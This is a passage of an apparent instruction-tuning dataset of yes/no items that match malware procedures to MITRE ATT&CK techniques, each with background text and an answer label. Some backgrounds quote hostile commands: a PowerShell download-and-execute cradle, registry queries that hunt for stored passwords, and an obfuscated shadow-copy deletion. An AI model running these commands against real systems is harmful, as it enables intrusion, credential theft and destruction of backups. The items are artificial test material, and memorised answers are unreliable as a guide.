Escalation.\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through Service Execution.\n\nTo make detection analysis more challenging, malicious services may also incorporate Masquerade Task or Service (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., Hide Artifacts), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.",
      "question": "Is procedure MoonWind installs itself as a new service with automatic startup to establish persistence. The service checks every 60 seconds to determine if the malware is running; if not, it will spawn a new instance.  related to technique Proxy",
      "yes/no": "No.\nThe provided context is correlated with Create or Modify System Process: Windows Service",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure SHARPSTATS has the ability to upload and download files.  related to technique Hijack Execution Flow: COR_PROFILER",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Ingress Tool Transfer: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
      "question": "Is procedure SHARPSTATS has the ability to upload and download files.  related to technique Hijack Execution Flow: COR_PROFILER",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure Emotet has been observed leveraging a module that can scrape email addresses from Outlook.  related to technique Account Discovery: Email Account.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Account Discovery: Email Account: Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).\n\nIn on-premises Exchange and Exchange Online, the<code>Get-GlobalAddressList</code> PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.\n\nIn Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.",
      "question": "Is procedure Emotet has been observed leveraging a module that can scrape email addresses from Outlook.  related to technique Account Discovery: Email Account",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Data from Network Shared Drive: Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within cmd may be used to gather information..\nQ: Is procedure Egregor can collect any files found in the enumerated drivers before sending it to its C2 channel.  related to technique Video Capture.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is correlated with Data from Network Shared Drive",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Data from Network Shared Drive: Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within cmd may be used to gather information.",
      "question": "Is procedure Egregor can collect any files found in the enumerated drivers before sending it to its C2 channel.  related to technique Video Capture",
      "yes/no": "No.\nThe provided context is correlated with Data from Network Shared Drive",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure A module in Prikormka collects information from the victim about the current user name. a type of technique System Owner/User Discovery",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Owner/User Discovery: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.",
      "question": "Is procedure A module in Prikormka collects information from the victim about the current user name. a type of technique System Owner/User Discovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Acquire Infrastructure: Domains: Adversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.\n\nAdversaries may use acquired domains for a variety of purposes, including for Phishing, Drive-by Compromise, and Command and Control. Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD). Typosquatting may be used to aid in delivery of payloads via Drive-by Compromise. Adversaries may also use internationalized domain names (IDNs) and different character sets (e.g. Cyrillic, Greek, etc.) to execute \"IDN homograph attacks,\" creating visually similar lookalike domains used to deliver malware to victim machines.\n\nDifferent URIs/URLs may also be dynamically generated to uniquely serve malicious content to victims (including one-time, single use domain names).\n\nAdversaries may also acquire and repurpose expired domains, which may be potentially already allowlisted/trusted by defenders based on an existing reputation/history.\n\nDomain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars..\nAnswer in Yes or No.\n\nQuestion: Is procedure For C0010, UNC3890 actors established domains that appeared to be legitimate services and entities, such as LinkedIn, Facebook, Office 365, and Pfizer.  related to technique Acquire Infrastructure: Domains",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Acquire Infrastructure: Domains: Adversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.\n\nAdversaries may use acquired domains for a variety of purposes, including for Phishing, Drive-by Compromise, and Command and Control. Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD). Typosquatting may be used to aid in delivery of payloads via Drive-by Compromise. Adversaries may also use internationalized domain names (IDNs) and different character sets (e.g. Cyrillic, Greek, etc.) to execute \"IDN homograph attacks,\" creating visually similar lookalike domains used to deliver malware to victim machines.\n\nDifferent URIs/URLs may also be dynamically generated to uniquely serve malicious content to victims (including one-time, single use domain names).\n\nAdversaries may also acquire and repurpose expired domains, which may be potentially already allowlisted/trusted by defenders based on an existing reputation/history.\n\nDomain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.",
      "question": "Is procedure For C0010, UNC3890 actors established domains that appeared to be legitimate services and entities, such as LinkedIn, Facebook, Office 365, and Pfizer.  related to technique Acquire Infrastructure: Domains",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure cmd can be used to find files and directories with native functionality such as <code>dir</code> commands. a type of technique Lateral Tool Transfer.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is correlated with File and Directory Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "File and Directory Discovery: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
      "question": "Is procedure cmd can be used to find files and directories with native functionality such as <code>dir</code> commands. a type of technique Lateral Tool Transfer",
      "yes/no": "No.\nThe provided context is correlated with File and Directory Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Hijack Execution Flow: COR_PROFILER: Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.\n\nThe COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a Component Object Model (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.\n\nAdversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: Bypass User Account Control) if the victim .NET process executes at a higher permission level, as well as to hook and Impair Defenses provided by .NET processes..\nAnswer in Yes or No.\n\nQuestion: Is procedure DarkTortilla can detect profilers by verifying the `COR_ENABLE_PROFILING` environment variable is present and active. a type of technique Masquerading: Masquerade Task or Service",
    "context": "",
    "output": "No.\nThe correct answer is Hijack Execution Flow: COR_PROFILER",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Hijack Execution Flow: COR_PROFILER: Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.\n\nThe COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a Component Object Model (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.\n\nAdversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: Bypass User Account Control) if the victim .NET process executes at a higher permission level, as well as to hook and Impair Defenses provided by .NET processes.",
      "question": "Is procedure DarkTortilla can detect profilers by verifying the `COR_ENABLE_PROFILING` environment variable is present and active. a type of technique Masquerading: Masquerade Task or Service",
      "yes/no": "No.\nThe correct answer is Hijack Execution Flow: COR_PROFILER",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure Catchamas obtains application windows titles and then determines which windows to perform Screen Capture on.  related to technique Application Window Discovery.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Application Window Discovery: Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used. For example, information about application windows could be used identify potential data to collect as well as identifying security tooling (Security Software Discovery) to evade.\n\nAdversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as Command and Scripting Interpreter commands and Native API functions.",
      "question": "Is procedure Catchamas obtains application windows titles and then determines which windows to perform Screen Capture on.  related to technique Application Window Discovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Non-Application Layer Protocol: Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications..\nAnswer in Yes or No.\n\nQuestion: Is procedure RainyDay can use TCP in C2 communications.  related to technique Active Scanning: Vulnerability Scanning",
    "context": "",
    "output": "No.\nThe provided context is related to Non-Application Layer Protocol",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Non-Application Layer Protocol: Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
      "question": "Is procedure RainyDay can use TCP in C2 communications.  related to technique Active Scanning: Vulnerability Scanning",
      "yes/no": "No.\nThe provided context is related to Non-Application Layer Protocol",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure KARAE can collect system information. a type of technique System Information Discovery",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Information Discovery: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
      "question": "Is procedure KARAE can collect system information. a type of technique System Information Discovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Command and Scripting Interpreter: Windows Command Shell: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel..\nQ: Is procedure KOMPROGO is capable of creating a reverse shell.  related to technique Command and Scripting Interpreter: Unix Shell.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is correlated with Command and Scripting Interpreter: Windows Command Shell",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Command and Scripting Interpreter: Windows Command Shell: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
      "question": "Is procedure KOMPROGO is capable of creating a reverse shell.  related to technique Command and Scripting Interpreter: Unix Shell",
      "yes/no": "No.\nThe provided context is correlated with Command and Scripting Interpreter: Windows Command Shell",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure T9000 searches removable storage devices for files with a pre-defined list of file extensions (e.g. * .doc, *.ppt, *.xls, *.docx, *.pptx, *.xlsx). Any matching files are encrypted and written to a local user directory. a type of technique Obfuscated Files or Information: Encrypted/Encoded File.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Automated Collection: Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a Command and Scripting Interpreter to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. \n\nIn cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data. \n\nThis functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as File and Directory Discovery and Lateral Tool Transfer to identify and move files, as well as Cloud Service Dashboard and Cloud Storage Object Discovery to identify resources in cloud environments.",
      "question": "Is procedure T9000 searches removable storage devices for files with a pre-defined list of file extensions (e.g. * .doc, *.ppt, *.xls, *.docx, *.pptx, *.xlsx). Any matching files are encrypted and written to a local user directory. a type of technique Obfuscated Files or Information: Encrypted/Encoded File",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Unsecured Credentials: Credentials in Registry: Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.\n\nExample commands to find Registry keys related to password information: \n\n* Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>\n* Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>.\nAnswer in Yes or No.\n\nQuestion: Is procedure IceApple can harvest credentials from local and remote host registries.  related to technique Obtain Capabilities: Malware",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Unsecured Credentials: Credentials in Registry: Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.\n\nExample commands to find Registry keys related to password information: \n\n* Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>\n* Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>",
      "question": "Is procedure IceApple can harvest credentials from local and remote host registries.  related to technique Obtain Capabilities: Malware",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Non-Application Layer Protocol: Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications..\nAnswer in Yes or No.\n\nQuestion: Is procedure QuasarRAT can use TCP for C2 communication.  related to technique Non-Application Layer Protocol",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Non-Application Layer Protocol: Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
      "question": "Is procedure QuasarRAT can use TCP for C2 communication.  related to technique Non-Application Layer Protocol",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure SUNBURST collected all network interface MAC addresses that are up and not loopback devices, as well as IP address, DHCP configuration, and domain information. a type of technique System Network Configuration Discovery.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Network Configuration Discovery: Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).\n\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.",
      "question": "Is procedure SUNBURST collected all network interface MAC addresses that are up and not loopback devices, as well as IP address, DHCP configuration, and domain information. a type of technique System Network Configuration Discovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Obfuscated Files or Information: Command Obfuscation: Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., Phishing and Drive-by Compromise) or interactively via Command and Scripting Interpreter.\n\nFor example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,  `^`, `+`. `$`, and `%`) to make commands difficult to analyze while maintaining the same intended functionality. Many languages support built-in obfuscation in the form of base64 or URL encoding. Adversaries may also manually implement command obfuscation via string splitting (`\u201cWor\u201d+\u201cd.Application\u201d`), order and casing of characters (`rev <<<'dwssap/cte/ tac'`), globing (`mkdir -p '/tmp/:&$NiA'`), as well as various tricks involving passing strings through tokens/environment variables/input streams.\n\nAdversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (`C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete`).\n\nTools such as <code>Invoke-Obfuscation</code> and <code>Invoke-DOSfucation</code> have also been used to obfuscate commands..\nQ: Is procedure Gamaredon Group has used obfuscated or encrypted scripts.  related to technique Obfuscated Files or Information: Command Obfuscation.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Obfuscated Files or Information: Command Obfuscation: Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., Phishing and Drive-by Compromise) or interactively via Command and Scripting Interpreter.\n\nFor example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,  `^`, `+`. `$`, and `%`) to make commands difficult to analyze while maintaining the same intended functionality. Many languages support built-in obfuscation in the form of base64 or URL encoding. Adversaries may also manually implement command obfuscation via string splitting (`\u201cWor\u201d+\u201cd.Application\u201d`), order and casing of characters (`rev <<<'dwssap/cte/ tac'`), globing (`mkdir -p '/tmp/:&$NiA'`), as well as various tricks involving passing strings through tokens/environment variables/input streams.\n\nAdversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (`C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete`).\n\nTools such as <code>Invoke-Obfuscation</code> and <code>Invoke-DOSfucation</code> have also been used to obfuscate commands.",
      "question": "Is procedure Gamaredon Group has used obfuscated or encrypted scripts.  related to technique Obfuscated Files or Information: Command Obfuscation",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure InvisiMole has a command to create, set, copy, or delete a specified Registry key or value.  related to technique Permission Groups Discovery: Local Groups.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is correlated with Modify Registry",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Modify Registry: Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.",
      "question": "Is procedure InvisiMole has a command to create, set, copy, or delete a specified Registry key or value.  related to technique Permission Groups Discovery: Local Groups",
      "yes/no": "No.\nThe provided context is correlated with Modify Registry",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure BitPaymer can modify the timestamp of an executable so that it can be identified and restored by the decryption tool.  related to technique Indicator Removal: Timestomp",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Indicator Removal: Timestomp: Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\n\nTimestomping may be used along with file name Masquerading to hide malware and tools.",
      "question": "Is procedure BitPaymer can modify the timestamp of an executable so that it can be identified and restored by the decryption tool.  related to technique Indicator Removal: Timestomp",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
